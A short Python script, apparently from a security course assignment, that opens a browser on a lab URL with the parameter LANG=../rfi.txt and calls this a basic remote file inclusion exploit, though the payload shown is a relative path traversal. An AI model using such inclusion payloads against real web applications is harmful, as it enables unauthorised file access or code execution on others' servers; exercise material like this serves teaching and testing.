import webbrowser

# Exploit: basic remote file inclusion without any mitigation 
# on the server side

def main():
    webbrowser.open('http://wsb.com/Assignment2/case13/case13.php?LANG=../rfi.txt', 2)

if __name__ == "__main__":
    main()
